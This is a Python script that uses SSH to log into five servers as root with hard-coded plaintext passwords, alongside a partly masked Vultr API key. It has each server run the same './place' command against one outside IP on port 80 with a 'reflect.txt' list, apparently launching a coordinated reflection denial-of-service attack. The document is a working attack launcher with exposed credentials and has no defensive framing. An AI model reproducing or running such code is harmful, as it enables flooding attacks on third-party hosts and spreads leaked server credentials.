
# Set your Vultr API key

import os
import pyvultr

# Set your Vultr API key
api_key = 'JAR3QCOWSR3VEY3LY5YSUX3***************'

# Initialize the PyVultr API
v = pyvultr.VultrV2(api_key)

import paramiko
import multiprocessing

def execute_command(ip, username, password, command):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(ip, username=username, password=password)
    stdin, stdout, stderr = ssh.exec_command(command)
    print(stdout.read().decode('utf-8'))
    ssh.close()

if __name__ == '__main__':
    ip1 = '173.199.118.46'
    username1 = 'root'
    password1 = 'zX[4oq8gmubYXjjp'
    command1 = './place 73.149.143.193 80 reflect.txt 250 -1 250'

    ip2 = '66.135.25.133'
    username2 = 'root'
    password2 = 'w4%AcGgYf_?!E44f'
    command2 = './place 73.149.143.193 80 reflect.txt 250 -1 250'

    ip3 = '149.28.228.14'
    username3 = 'root'
    password3 = 'j.8L!2n66[BgP@tg'
    command3 = './place 73.149.143.193 80 reflect.txt 250 -1 250'

    ip4 = '149.28.228.14'
    username4 = 'root'
    password4 = 'j.8L!2n66[BgP@tg'
    command4 = './place 73.149.143.193 80 reflect.txt 250 -1 250'
    
    ip5 = '64.176.204.52'
    username5 = 'root'
    password5 = 'k-5R=os![[,pxR$Z'
    command5 = './place 73.149.143.193 80 reflect.txt 250 -1 250'


    p = multiprocessing.Pool(processes=5)
    p.apply_async(execute_command, args=(ip1, username1, password1, command1))
    p.apply_async(execute_command, args=(ip2, username2, password2, command2))
    p.apply_async(execute_command, args=(ip3, username3, password3, command3))
    p.apply_async(execute_command, args=(ip4, username4, password4, command4))
    p.apply_async(execute_command, args=(ip5, username5, password5, command5))
    p.close()
    p.join()
